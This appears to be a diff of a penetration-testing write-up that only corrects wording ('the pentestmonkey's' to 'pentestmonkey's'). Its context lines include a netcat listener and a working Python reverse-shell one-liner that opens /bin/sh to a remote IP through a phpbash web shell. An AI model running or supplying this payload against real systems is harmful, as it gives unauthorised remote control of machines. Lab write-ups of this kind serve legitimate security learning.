@@ -104,7 +104,7 @@ First, let's set up the listener on the attacker machine:
 sudo nc -lvp 8888 
 ```
 
-Then, with a little help from the pentestmonkey's [reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), hit the listener from the phpbash web interface (replace IP and port by the listener's):
+Then, with a little help from pentestmonkey's [reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), hit the listener from the phpbash web interface (replace IP and port by the listener's):
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
